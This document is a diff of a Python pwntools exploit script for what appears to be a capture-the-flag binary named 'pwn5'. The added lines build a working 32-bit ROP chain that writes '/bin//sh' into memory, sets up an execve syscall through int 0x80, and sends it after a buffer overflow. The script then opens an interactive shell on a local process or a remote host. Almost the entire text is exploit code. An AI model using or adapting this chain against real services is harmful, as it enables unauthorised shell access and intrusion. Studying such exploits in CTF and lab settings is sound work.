@@ -20,7 +20,42 @@ def exploit(r):
     r.sendline("y")
     r.sendline("2")
     r.send("A"*32)
-    r.sendline("BBBB")
+    p = ''
+
+    p += p32(0x0807338a) # pop edx ; ret
+    p += p32(0x080f0060) # @ .data
+    p += p32(0x080bc396) # pop eax ; ret
+    p += '/bin'
+    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
+    p += p32(0x0807338a) # pop edx ; ret
+    p += p32(0x080f0064) # @ .data + 4
+    p += p32(0x080bc396) # pop eax ; ret
+    p += '//sh'
+    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
+    p += p32(0x0807338a) # pop edx ; ret
+    p += p32(0x080f0068) # @ .data + 8
+    p += p32(0x080496b3) # xor eax, eax ; ret
+    p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
+    p += p32(0x080481d1) # pop ebx ; ret
+    p += p32(0x080f0060) # @ .data
+    p += p32(0x080e4325) # pop ecx ; ret
+    p += p32(0x080f0068) # @ .data + 8
+    p += p32(0x0807338a) # pop edx ; ret
+    p += p32(0x080f0068) # @ .data + 8
+    p += p32(0x080496b3) # xor eax, eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x0807ebcf) # inc eax ; ret
+    p += p32(0x08071005) # int 0x80
+    r.sendline(p)
 
 
     r.interactive()
@@ -34,6 +69,7 @@ if __name__ == "__main__":
     log.info("For remote %s HOST PORT" % sys.argv[0])
     if len(sys.argv) > 1:
         r = remote(sys.argv[1], int(sys.argv[2]))
+        pause()
         exploit(r)
     else:
         r = process('./pwn5')     #put binary here
